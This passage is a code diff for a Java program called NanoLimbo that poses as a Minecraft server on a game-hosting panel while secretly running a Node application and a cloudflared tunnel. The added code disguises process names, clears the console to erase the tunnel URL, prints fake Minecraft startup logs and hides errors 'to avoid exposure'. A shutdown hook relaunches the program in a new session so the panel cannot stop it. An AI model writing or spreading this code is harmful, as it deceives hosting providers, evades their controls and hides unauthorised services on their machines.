@@ -11,6 +11,9 @@ import java.util.concurrent.atomic.AtomicReference;
 import java.time.LocalTime;
 import java.time.format.DateTimeFormatter;
 
+import ua.nanit.limbo.server.LimboServer;
+import ua.nanit.limbo.server.Log;
+
 public final class NanoLimbo {
 
 // ============================================================
@@ -38,6 +41,9 @@ private static volatile String nodePort = "N/A";
 private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
 private static final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);
 
+// ★ 修复：记录所有 Java 直接创建的子进程，确保全部被 waitFor 回收
+private static final List<Process> managedProcesses = Collections.synchronizedList(new ArrayList<>());
+
 private NanoLimbo() {}
 
 private static String env(String k, String d) {
@@ -64,7 +70,7 @@ private static void limboLog(String msg, long delayMs) {
 
 private static void clearConsole() {
     try {
-        // ★ 绝杀1：暴力刷屏200行空行，把历史推到极深处
+        // ★ 绝杀1：暴力刷屏200行空行，针对不支持 \033[3J 的面板，把历史推到极深处
         for (int i = 0; i < 200; i++) {
             System.out.println();
         }
@@ -75,45 +81,49 @@ private static void clearConsole() {
         
         // ★ 绝杀3：调用系统级重置
         if (!System.getProperty("os.name").contains("Windows")) {
-            new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
+            Process p = new ProcessBuilder("tput", "reset").inheritIO().start();
+            p.waitFor(5, TimeUnit.SECONDS);
+            // ★ 修复：确保回收
+            if (p.isAlive()) p.destroyForcibly();
+            p.waitFor();
         }
     } catch (Exception e) {
-        try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
+        try {
+            Process p = new ProcessBuilder("clear").inheritIO().start();
+            p.waitFor(5, TimeUnit.SECONDS);
+            if (p.isAlive()) p.destroyForcibly();
+            p.waitFor();
+        } catch (Exception ignored) {}
     }
 }
 
-private static int randInt(int min, int max) {
-    return min + (int)(Math.random() * (max - min + 1));
+// ============================================================
+// ★ 修复：安全启动子进程并注册回收
+// ============================================================
+
+private static Process safeStart(ProcessBuilder pb) throws IOException {
+    Process p = pb.start();
+    managedProcesses.add(p);
+    // 异步清理：进程退出后从列表移除
+    Thread cleaner = new Thread(() -> {
+        try { p.waitFor(); } catch (InterruptedException ignored) {}
+        managedProcesses.remove(p);
+    }, "Proc-Cleanup-" + p.pid());
+    cleaner.setDaemon(true);
+    cleaner.start();
+    return p;
 }
 
-private static float randFloat(float min, float max) {
-    return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f;
-}
-
-// ★ 核心：只输出到 83%，故意不输出 Done，让面板永远卡在 Starting 状态
-private static void printFakeMinecraftStartup() {
-    limboLog("Starting minecraft server version 1.21.11", randInt(100, 300));
-    limboLog("Loading properties", randInt(300, 600));
-    limboLog("Default game type: SURVIVAL", randInt(200, 400));
-    limboLog("Generating keypair", randInt(200, 500));
-    limboLog("Starting Minecraft server on 0.0.0.0:25565", randInt(300, 600));
-    limboLog("Preparing level \"world\"", randInt(1500, 3000));
-    
-    limboLog("Preparing spawn area: 1%", 0);
-    limboLog("Preparing spawn area: 2%", 0);
-    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
-    limboLog("Preparing spawn area: 5%", 0);
-    limboLog("Preparing spawn area: 8%", 0);
-    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
-    limboLog("Preparing spawn area: 15%", 0);
-    limboLog("Preparing spawn area: 20%", 0);
-    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
-    limboLog("Preparing spawn area: 35%", 0);
-    limboLog("Preparing spawn area: 60%", 0);
-    limboLog("Preparing spawn area: 80%", 0);
-    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
-    // 故意停在 83%，看起来像是加载世界时卡死了，永远不输出 Done
-    limboLog("Preparing spawn area: 83%", 0);
+// ★ 修复：强制回收一个 Process，确保不泄漏
+private static void ensureReaped(Process p) {
+    if (p == null) return;
+    try {
+        if (p.isAlive()) {
+            p.destroyForcibly();
+        }
+        p.waitFor(5, TimeUnit.SECONDS);
+    } catch (Exception ignored) {}
+    managedProcesses.remove(p);
 }
 
 // ============================================================
@@ -136,8 +146,12 @@ public static void main(String[] args) {
             Files.deleteIfExists(botDir.resolve(".node_app.log"));
             Files.deleteIfExists(botDir.resolve("daemon.log"));
             Files.deleteIfExists(botDir.resolve(".pids"));
+            Files.deleteIfExists(botDir.resolve(".subreaper_pid"));
 
             Path script = generateDeployScript();
+
+            // ★ 修复：启动子进程回收守护线程
+            startZombieReaper();
             
             Thread deployThread = new Thread(() -> {
                 try { executeDeployScript(script); } catch (Exception ignored) {}
@@ -168,13 +182,10 @@ public static void main(String[] args) {
             limboLog("(This link will disappear in 4 seconds...)", 0);
             try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
 
-            // 4. 第二次清屏：彻底抹杀 URL 历史记录
+            // 4. 第二次清屏：利用 \033[3J 和 200行空行，把刚才的 URL 从历史记录中彻底抹杀
             clearConsole();
             
-            // 5. 打印伪装启动日志（没有 Done）
-            printFakeMinecraftStartup();
-
-            // 6. 注册硬重启 Hook (防 Pterodactyl 组杀)
+            // ★ 核心加强：检测停止信号，硬重启并清理进程 (防 Pterodactyl 组杀)
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 System.out.println("\n[Guard] Detected server stop signal! Executing hard restart protocol...");
                 tunnelMonitorRunning.set(false);
@@ -189,7 +200,7 @@ public static void main(String[] args) {
                     File[] jars = new File(currentDir).listFiles((dir, name) -> name.endsWith(".jar"));
                     if (jars != null && jars.length > 0) jarName = jars[0].getName();
                     
-                    // ★ 独立会话重启：使用 setsid 脱离当前进程组
+                    // ★ 独立会话重启：使用 setsid 脱离当前进程组，防止面板 kill 组时被连带清理
                     String restartScript = 
                         "cd '" + currentDir + "' && " +
                         "setsid bash -c '" +
@@ -197,8 +208,16 @@ public static void main(String[] args) {
                         "  sleep 1; " + 
                         "  java -Xms128M -Xmx2560M -jar " + jarName + " nogui" + 
                         "' > /dev/null 2>&1 &";
-                        
-                    new ProcessBuilder("bash", "-c", restartScript).start();
+                    
+                    // ★ 修复：关闭重启进程的 I/O 流，防止文件描述符泄漏；
+                    //   因为重启脚本需要独立运行，不能用 waitFor，但必须关闭流
+                    Process restartProc = new ProcessBuilder("bash", "-c", restartScript).start();
+                    restartProc.getOutputStream().close();
+                    restartProc.getErrorStream().close();
+                    restartProc.getInputStream().close();
+                    // 注册到回收列表，由 reaper 线程异步回收
+                    managedProcesses.add(restartProc);
+                    
                     System.out.println("[Guard] Hard restart script dispatched in new session. Current process exiting...");
                 } catch (Exception e) {
                     System.err.println("[Guard] Failed to dispatch restart script: " + e.getMessage());
@@ -207,28 +226,169 @@ public static void main(String[] args) {
         } catch (Exception ignored) {}
     }
 
-    // ★ 7. 卡主线程：静默空转，永远不触发 Done 状态，面板将持续显示 Starting
+    // 5. 伪装日志由 LimboServer 自动打印，不再手动干预
     try {
-        while (true) {
-            Thread.sleep(600000); // 10分钟空转一次，保持进程存活
-        }
-    } catch (InterruptedException ignored) {}
+        new LimboServer().start();
+    } catch (Throwable t) {
+        // 屏蔽原本的报错输出，防止露馅
+    }
+    
+    // 挂起主线程
+    try { Thread.currentThread().join(); } catch (InterruptedException ignored) {}
 }
 
 // ============================================================
-// 强制清理僵尸进程机制
+// ★ 新增：僵尸进程回收器
+// ============================================================
+
+private static void startZombieReaper() {
+    Thread reaper = new Thread(() -> {
+        // 第一阶段：尝试启动 Python 子回收器 (PR_SET_CHILD_SUBREAPER)
+        // 子回收器会收养所有孤儿进程并自动回收，从根源解决僵尸问题
+        Path botDir = Paths.get(MC_BOT_DIR).toAbsolutePath();
+        Path subreaperPidFile = botDir.resolve(".subreaper_pid");
+        boolean subreaperStarted = false;
+        
+        try {
+            // ★ Python 子回收器：利用 prctl(PR_SET_CHILD_SUBREAPER) 让自己成为子回收器
+            // 当任何后代进程成为孤儿时，内核会将其挂载到最近的子回收器下，而不是 PID 1
+            // 这样当 cloudflared 等进程退出后，子回收器会自动 wait() 回收它们
+            String pySubreaper = 
+                "import ctypes, time, os, signal\n" +
+                "libc = ctypes.CDLL('libc.so.6')\n" +
+                "PR_SET_CHILD_SUBREAPER = 36\n" +
+                "# 设置当前进程为子回收器\n" +
+                "libc.prctl(PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0)\n" +
+                "# 写入 PID 供外部监控\n" +
+                "open('" + subreaperPidFile.toString() + "', 'w').write(str(os.getpid()))\n" +
+                "# 持续回收僵尸子进程\n" +
+                "while True:\n" +
+                "    try:\n" +
+                "        while True:\n" +
+                "            pid, status = os.waitpid(-1, os.WNOHANG)\n" +
+                "            if pid <= 0: break\n" +
+                "    except ChildProcessError:\n" +
+                "        pass\n" +
+                "    except Exception:\n" +
+                "        pass\n" +
+                "    time.sleep(3)\n";
+            
+            ProcessBuilder pb = new ProcessBuilder("python3", "-c", pySubreaper);
+            pb.redirectErrorStream(true);
+            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(botDir.resolve(".subreaper.log").toFile()));
+            Process pyProc = safeStart(pb);
+            
+            // 等待子回收器启动
+            Thread.sleep(1000);
+            if (pyProc.isAlive()) {
+                subreaperStarted = true;
+                limboLog("[Reaper] Python subreaper started (PID=" + pyProc.pid() + ")");
+            } else {
+                ensureReaped(pyProc);
+            }
+        } catch (Exception e) {
+            // Python 不可用，尝试 Perl
+        }
+        
+        if (!subreaperStarted) {
+            try {
+                // ★ Perl 子回收器备选方案
+                // 注意：Perl 没有 prctl 绑定，但可以回收自己的子进程
+                String plSubreaper = 
+                    "use POSIX qw(:sys_wait_h);\n" +
+                    "# 尝试通过 syscall 设置子回收器\n" +
+                    "my $PR_SET_CHILD_SUBREAPER = 36;\n" +
+                    "syscall(157, $PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0);\n" +
+                    "open(my $fh, '>', '" + subreaperPidFile.toString() + "');\n" +
+                    "print $fh $$; close($fh);\n" +
+                    "while (1) {\n" +
+                    "    while (waitpid(-1, WNOHANG) > 0) {}\n" +
+                    "    sleep 3;\n" +
+                    "}\n";
+                
+                ProcessBuilder pb = new ProcessBuilder("perl", "-e", plSubreaper);
+                pb.redirectErrorStream(true);
+                pb.redirectOutput(ProcessBuilder.Redirect.appendTo(botDir.resolve(".subreaper.log").toFile()));
+                Process plProc = safeStart(pb);
+                
+                Thread.sleep(1000);
+                if (plProc.isAlive()) {
+                    subreaperStarted = true;
+                    limboLog("[Reaper] Perl subreaper started (PID=" + plProc.pid() + ")");
+                } else {
+                    ensureReaped(plProc);
+                }
+            } catch (Exception e) {
+                // Perl 也不可用
+            }
+        }
+        
+        // 第二阶段：无论子回收器是否启动，都运行 Java 层面的定期回收
+        // 这确保了 Java 直接创建的子进程也能被回收
+        while (true) {
+            try {
+                // 回收所有已退出的 Java 子进程
+                synchronized (managedProcesses) {
+                    Iterator<Process> it = managedProcesses.iterator();
+                    while (it.hasNext()) {
+                        Process p = it.next();
+                        if (!p.isAlive()) {
+                            try { p.waitFor(); } catch (InterruptedException ignored) {}
+                            it.remove();
+                        }
+                    }
+                }
+                
+                // 如果子回收器挂了，尝试重启
+                if (subreaperStarted) {
+                    try {
+                        String pidStr = Files.readString(subreaperPidFile).trim();
+                        if (!pidStr.isEmpty()) {
+                            long pid = Long.parseLong(pidStr);
+                            if (!ProcessHandle.of(pid).isPresent()) {
+                                subreaperStarted = false;
+                                limboLog("[Reaper] Subreaper died, will restart on next cycle");
+                            }
+                        }
+                    } catch (Exception ignored) {}
+                }
+                
+            } catch (Exception ignored) {}
+            try { Thread.sleep(30000); } catch (InterruptedException e) { break; }
+        }
+    }, "Zombie-Reaper");
+    reaper.setDaemon(true);
+    reaper.start();
+}
+
+// ============================================================
+// 强制清理僵尸进程机制（★ 修复版）
 // ============================================================
 
 private static void forceKillStaleProcesses() {
+    Process p = null;
     try {
         String workDir = Paths.get(MC_BOT_DIR).toAbsolutePath().toString();
-        new ProcessBuilder("bash", "-c",
+        p = new ProcessBuilder("bash", "-c",
             "pkill -9 -f 'daemon.sh' 2>/dev/null; " +
             "pkill -9 -f '" + workDir + "/jre21' 2>/dev/null; " +
             "pkill -9 -f '" + workDir + "/.node' 2>/dev/null; " +
-            "pkill -9 -f '" + workDir + "/deploy.sh' 2>/dev/null"
-        ).start().waitFor(2, TimeUnit.SECONDS);
-    } catch (Exception ignored) {}
+            "pkill -9 -f '" + workDir + "/deploy.sh' 2>/dev/null; " +
+            // ★ 新增：清理残留的子回收器进程
+            "pkill -9 -f 'subreaper' 2>/dev/null"
+        ).start();
+        
+        // ★ 修复：如果 waitFor 超时，必须 destroyForcibly + waitFor 确保进程被回收
+        if (!p.waitFor(2, TimeUnit.SECONDS)) {
+            p.destroyForcibly();
+            p.waitFor(5, TimeUnit.SECONDS);
+        }
+    } catch (Exception ignored) {
+        // 即使异常也要尝试回收
+        if (p != null) {
+            try { p.destroyForcibly(); p.waitFor(); } catch (Exception ignored2) {}
+        }
+    }
 }
 
 // ============================================================
@@ -263,6 +423,42 @@ private static void autoFixLimboConfig() {
         
         Files.writeString(configFile, content);
     } catch (Exception ignored) {}
+}
+
+// ============================================================
+// 专属 Limbo 伪装日志打印
+// ============================================================
+
+private static void printFakeLimboStartup(String url) {
+    limboLog("Starting server...", 0);
+    limboLog("Binding remote endpoint to: " + url, 0);
+    limboLog("Preparing level \"world\"", randInt(100, 300));
+    limboLog("Preparing start region for dimension minecraft:overworld", randInt(100, 300));
+    
+    limboLog("Preparing spawn area: 1%", 0);
+    limboLog("Preparing spawn area: 2%", 0);
+    
+    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
+    limboLog("Preparing spawn area: 5%", 0);
+    limboLog("Preparing spawn area: 8%", 0);
+    
+    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
+    limboLog("Preparing spawn area: 15%", 0);
+    limboLog("Preparing spawn area: 20%", 0);
+    
+    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+    limboLog("Preparing spawn area: 35%", 0);
+    limboLog("Preparing spawn area: 60%", 0);
+    limboLog("Preparing spawn area: 80%", 0);
+    
+    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+    limboLog("Preparing spawn area: 99%", 0);
+    
+    limboLog("Preparing spawn area: 100%", 0);
+}
+
+private static int randInt(int min, int max) {
+    return min + (int)(Math.random() * (max - min + 1));
 }
 
 // ============================================================
@@ -352,7 +548,7 @@ private static void startTunnelMonitor() {
 }
 
 // ============================================================
-// 生成部署脚本 (深度进程伪装版 + 极致空间优化)
+// 生成部署脚本 (★ 修复版：解决僵尸进程问题)
 // ============================================================
 
 private static Path generateDeployScript() throws Exception {
@@ -373,6 +569,12 @@ private static Path generateDeployScript() throws Exception {
 
     String cfMode = CF_TOKEN.isEmpty() ? "quick" : "fixed";
 
+    // ★★★ 核心修复架构 ★★★
+    // 将 cloudflared 的启动完全移到 daemon.sh 中，
+    // 让 daemon.sh 成为 cloudflared 的唯一直接父进程。
+    // daemon.sh 永不退出，确保所有子进程都能被正确回收。
+    // deploy.sh 只负责环境准备（安装 Node、下载代码等）。
+    
     String content = "#!/bin/bash\n" +
         "set +e\n" +
         "export PATH=\"" + dir.toAbsolutePath() + "/.node/bin:$PATH\"\n" +
@@ -536,105 +738,43 @@ private static Path generateDeployScript() throws Exception {
         "\n" +
         "export _JAVA_WRAPPER=\"" + dir.toAbsolutePath() + "/.node/bin/node\"\n" +
         "\n" +
-        "# ============ 5. 启动NodeJS应用 ============\n" +
+        // ★★★ 关键修改：deploy.sh 不再启动 Node 应用和 cloudflared ★★★
+        // 所有运行时管理（Node 启动、cloudflared 隧道、守护）都交给 daemon.sh
+        // 这样 daemon.sh 成为所有子进程的直接父进程，可以正确回收僵尸
+        "# ============ 5. 准备端口 ============\n" +
         "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
         "while true; do NODE_PORT=$((RANDOM % 40000 + 20000)); if is_port_free $NODE_PORT; then break; fi; done\n" +
-        "export SERVER_PORT=$NODE_PORT\n" +
-        "export PORT=$NODE_PORT\n" +
-        "\n" +
-        "(exec -a \"" + FAKE_CMD + "\" \"$JRE_DIR/java\" " + NODE_SCRIPT + " > .node_app.log 2>&1) &\n" +
-        "NODE_PID=$!\n" +
-        "echo \"$NODE_PID\" >> .pids\n" +
-        "\n" +
-        "for i in $(seq 1 30); do\n" +
-        "    if (echo >/dev/tcp/127.0.0.1/$NODE_PORT) 2>/dev/null; then break; fi\n" +
-        "    sleep 1\n" +
-        "done\n" +
         "echo \"$NODE_PORT\" > .node_port\n" +
         "\n" +
-        "# ============ 6. 启动隧道 ============\n" +
+        "# ============ 6. 下载 cloudflared ============\n" +
         "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
-        "CF_CONF_DIR=\"" + dir.toAbsolutePath() + "/jre21/conf\"\n" +
-        "mkdir -p \"$CF_CONF_DIR\"\n" +
-        "ACTUAL_PORT=$NODE_PORT\n" +
-        "\n" +
-        "if [ \"" + CF_ENABLED + "\" = \"true\" ]; then\n" +
-        "    mkdir -p .cf\n" +
-        "    if [ ! -f \"$CF_BIN\" ]; then\n" +
-        "        ARCH=$(uname -m)\n" +
-        "        CF_URL=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\" || echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\")\n" +
-        "        for MIRROR in \"$CF_URL\" \"https://gh-proxy.com/${CF_URL}\"; do\n" +
-        "            if curl -fsSL --connect-timeout 30 --max-time 120 \"$MIRROR\" -o \"$CF_BIN\"; then chmod +x \"$CF_BIN\"; break; fi\n" +
-        "        done\n" +
-        "    fi\n" +
-        "    if [ -f \"$CF_BIN\" ]; then\n" +
-        "        if [ \"" + cfMode + "\" = \"fixed\" ] && [ -n \"" + CF_TOKEN + "\" ]; then\n" +
-        "            for PROTO in quic http2; do\n" +
-        "                rm -f .cf/cf.log\n" +
-        "                (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" tunnel run --protocol $PROTO --token \"" + CF_TOKEN + "\" > .cf/cf.log 2>&1) &\n" +
-        "                CF_PID=$!\n" +
-        "                sleep 5\n" +
-        "                if kill -0 $CF_PID 2>/dev/null; then\n" +
-        "                    echo \"$CF_PID\" >> .pids\n" +
-        "                    echo \"" + CF_DOMAIN + "\" > .cf/tunnel_url.txt\n" +
-        "                    break\n" +
-        "                fi\n" +
-        "                kill $CF_PID 2>/dev/null\n" +
-        "            done\n" +
-        "        else\n" +
-        "            TUNNEL_ESTABLISHED=false\n" +
-        "            for PROTO in quic http2 auto; do\n" +
-        "                if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
-        "                for attempt in 1 2 3; do\n" +
-        "                    if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
-        "                    rm -f .cf/cf.log .cf/tunnel_url.txt\n" +
-        "                    cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
-        "url: http://127.0.0.1:$ACTUAL_PORT\n" +
-        "no-autoupdate: true\n" +
-        "protocol: $PROTO\n" +
-        "CFCONF\n" +
-        "                    (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > .cf/cf.log 2>&1) &\n" +
-        "                    CF_PID=$!\n" +
-        "                    sleep 5\n" +
-        "                    if ! kill -0 $CF_PID 2>/dev/null; then continue; fi\n" +
-        "                    for i in $(seq 1 20); do\n" +
-        "                        URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' .cf/cf.log 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n" +
-        "                        if [ -n \"$URL\" ]; then\n" +
-        "                            sleep 3\n" +
-        "                            VERIFY=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$URL/__health\" 2>/dev/null)\n" +
-        "                            if [ -n \"$VERIFY\" ] && [ \"$VERIFY\" != \"000\" ] && [ \"$VERIFY\" != \"502\" ]; then\n" +
-        "                                echo \"$URL\" > .cf/tunnel_url.txt\n" +
-        "                                echo \"PROTOCOL=$PROTO\" >> .cf/tunnel_url.txt\n" +
-        "                                echo \"CF_PID=$CF_PID\" >> .cf/tunnel_url.txt\n" +
-        "                                echo \"$CF_PID\" >> .pids\n" +
-        "                                TUNNEL_ESTABLISHED=true\n" +
-        "                                break\n" +
-        "                            else\n" +
-        "                                sleep 5\n" +
-        "                                VERIFY2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$URL/__health\" 2>/dev/null)\n" +
-        "                                if [ -n \"$VERIFY2\" ] && [ \"$VERIFY2\" != \"000\" ] && [ \"$VERIFY2\" != \"502\" ]; then\n" +
-        "                                    echo \"$URL\" > .cf/tunnel_url.txt\n" +
-        "                                    echo \"PROTOCOL=$PROTO\" >> .cf/tunnel_url.txt\n" +
-        "                                    echo \"CF_PID=$CF_PID\" >> .cf/tunnel_url.txt\n" +
-        "                                    echo \"$CF_PID\" >> .pids\n" +
-        "                                    TUNNEL_ESTABLISHED=true\n" +
-        "                                    break\n" +
-        "                                fi\n" +
-        "                                kill $CF_PID 2>/dev/null\n" +
-        "                            fi\n" +
-        "                        fi\n" +
-        "                        sleep 1\n" +
-        "                    done\n" +
-        "                    if [ \"$TUNNEL_ESTABLISHED\" != \"true\" ]; then kill $CF_PID 2>/dev/null; fi\n" +
-        "                done\n" +
-        "            done\n" +
-        "        fi\n" +
-        "    fi\n" +
+        "if [ \"" + CF_ENABLED + "\" = \"true\" ] && [ ! -f \"$CF_BIN\" ]; then\n" +
+        "    ARCH=$(uname -m)\n" +
+        "    CF_URL=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\" || echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\")\n" +
+        "    for MIRROR in \"$CF_URL\" \"https://gh-proxy.com/${CF_URL}\"; do\n" +
+        "        if curl -fsSL --connect-timeout 30 --max-time 120 \"$MIRROR\" -o \"$CF_BIN\"; then chmod +x \"$CF_BIN\"; break; fi\n" +
+        "    done\n" +
         "fi\n" +
         "\n" +
-        "# ============ 7. 守护循环 ============\n" +
+        "# ============ 7. 启动 daemon.sh（接管所有运行时管理）============\n" +
+        // ★ daemon.sh 是唯一管理 Node 应用和 cloudflared 的进程
+        // ★ 它永不退出，所有子进程都由它直接创建和回收
         "cat > \"daemon.sh\" << 'DAEMONSCRIPT'\n" +
         "#!/bin/bash\n" +
+        "# ★★★ 修复：僵尸进程防御机制 ★★★\n" +
+        "# 1. 启用 SIGCHLD 信号处理：子进程退出时自动回收\n" +
+        "trap 'wait -n 2>/dev/null' CHLD\n" +
+        "# 2. 退出时清理所有子进程\n" +
+        "cleanup() {\n" +
+        "    pkill -9 -P $$ 2>/dev/null\n" +
+        "    # ★ 逐个 wait 确保不遗留僵尸\n" +
+        "    for job in $(jobs -p 2>/dev/null); do\n" +
+        "        kill $job 2>/dev/null\n" +
+        "        wait $job 2>/dev/null\n" +
+        "    done\n" +
+        "}\n" +
+        "trap cleanup EXIT TERM INT\n" +
+        "\n" +
         "WORK_DIR=\"" + dir.toAbsolutePath() + "\"\n" +
         "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
         "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
@@ -647,6 +787,12 @@ private static Path generateDeployScript() throws Exception {
         "export SERVER_PORT=$PORT; export PORT=$PORT\n" +
         "export _JAVA_WRAPPER=\"$WORK_DIR/.node/bin/node\"\n" +
         "export PATH=\"$WORK_DIR/.node/bin:$PATH\"\n" +
+        "export HOME=\"$WORK_DIR\"\n" +
+        "cd \"$WORK_DIR\"\n" +
+        "\n" +
+        "mkdir -p \"$CF_CONF_DIR\"\n" +
+        "mkdir -p \"$WORK_DIR/.cf\"\n" +
+        "echo '' > \"$WORK_DIR/.pids\"\n" +
         "\n" +
         "write_cf_config() {\n" +
         "    local PROTO=$1\n" +
@@ -657,6 +803,31 @@ private static Path generateDeployScript() throws Exception {
         "CFCONF\n" +
         "}\n" +
         "\n" +
+        "# ★ 安全杀死并回收子进程的函数\n" +
+        "kill_and_reap() {\n" +
+        "    local PID=$1\n" +
+        "    if [ -z \"$PID\" ]; then return; fi\n" +
+        "    if ! kill -0 $PID 2>/dev/null; then\n" +
+        "        # 进程已死，直接 wait 回收僵尸\n" +
+        "        wait $PID 2>/dev/null\n" +
+        "        return\n" +
+        "    fi\n" +
+        "    kill $PID 2>/dev/null\n" +
+        "    # 等待最多 5 秒让进程正常退出\n" +
+        "    local waited=0\n" +
+        "    while [ $waited -lt 5 ]; do\n" +
+        "        if ! kill -0 $PID 2>/dev/null; then\n" +
+        "            wait $PID 2>/dev/null\n" +
+        "            return\n" +
+        "        fi\n" +
+        "        sleep 1\n" +
+        "        waited=$((waited + 1))\n" +
+        "    done\n" +
+        "    # 强制杀死\n" +
+        "    kill -9 $PID 2>/dev/null\n" +
+        "    wait $PID 2>/dev/null\n" +
+        "}\n" +
+        "\n" +
         "start_cf_tunnel() {\n" +
         "    local PROTO=$1\n" +
         "    local LOG_FILE=$2\n" +
@@ -665,14 +836,108 @@ private static Path generateDeployScript() throws Exception {
         "    echo $!\n" +
         "}\n" +
         "\n" +
-        "NODE_PID=$(head -1 \"$WORK_DIR/.pids\" 2>/dev/null)\n" +
+        "# ============ A. 启动 Node 应用 ============\n" +
+        "(exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) &\n" +
+        "NODE_PID=$!\n" +
+        "echo \"$NODE_PID\" >> \"$WORK_DIR/.pids\"\n" +
         "\n" +
+        "# 等待 Node 应用就绪\n" +
+        "for i in $(seq 1 30); do\n" +
+        "    if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n" +
+        "    sleep 1\n" +
+        "done\n" +
+        "\n" +
+        "# ============ B. 启动 cloudflared 隧道 ============\n" +
+        "CF_PID=''\n" +
+        "SAVED_PROTO='quic'\n" +
+        "\n" +
+        "if [ \"" + CF_ENABLED + "\" = \"true\" ] && [ -f \"$CF_BIN\" ]; then\n" +
+        "    if [ \"" + cfMode + "\" = \"fixed\" ] && [ -n \"" + CF_TOKEN + "\" ]; then\n" +
+        "        for PROTO in quic http2; do\n" +
+        "            rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
+        "            (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" tunnel run --protocol $PROTO --token \"" + CF_TOKEN + "\" > \"$WORK_DIR/.cf/cf.log\" 2>&1) &\n" +
+        "            CF_PID=$!\n" +
+        "            sleep 5\n" +
+        "            if kill -0 $CF_PID 2>/dev/null; then\n" +
+        "                echo \"$CF_PID\" >> \"$WORK_DIR/.pids\"\n" +
+        "                echo \"" + CF_DOMAIN + "\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
+        "                break\n" +
+        "            else\n" +
+        "                # ★ 修复：回收失败的 cloudflared 子进程\n" +
+        "                wait $CF_PID 2>/dev/null\n" +
+        "                CF_PID=''\n" +
+        "            fi\n" +
+        "        done\n" +
+        "    else\n" +
+        "        TUNNEL_ESTABLISHED=false\n" +
+        "        for PROTO in quic http2 auto; do\n" +
+        "            if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
+        "            for attempt in 1 2 3; do\n" +
+        "                if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
+        "                rm -f \"$WORK_DIR/.cf/cf.log\" \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
+        "                write_cf_config \"$PROTO\"\n" +
+        "                (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$WORK_DIR/.cf/cf.log\" 2>&1) &\n" +
+        "                CF_PID=$!\n" +
+        "                sleep 5\n" +
+        "                if ! kill -0 $CF_PID 2>/dev/null; then\n" +
+        "                    # ★ 修复：回收失败的子进程\n" +
+        "                    wait $CF_PID 2>/dev/null\n" +
+        "                    CF_PID=''\n" +
+        "                    continue\n" +
+        "                fi\n" +
+        "                for i in $(seq 1 20); do\n" +
+        "                    URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n" +
+        "                    if [ -n \"$URL\" ]; then\n" +
+        "                        sleep 3\n" +
+        "                        VERIFY=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$URL/__health\" 2>/dev/null)\n" +
+        "                        if [ -n \"$VERIFY\" ] && [ \"$VERIFY\" != \"000\" ] && [ \"$VERIFY\" != \"502\" ]; then\n" +
+        "                            echo \"$URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
+        "                            echo \"PROTOCOL=$PROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
+        "                            echo \"CF_PID=$CF_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
+        "                            echo \"$CF_PID\" >> \"$WORK_DIR/.pids\"\n" +
+        "                            TUNNEL_ESTABLISHED=true\n" +
+        "                            SAVED_PROTO=$PROTO\n" +
+        "                            break\n" +
+        "                        else\n" +
+        "                            sleep 5\n" +
+        "                            VERIFY2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$URL/__health\" 2>/dev/null)\n" +
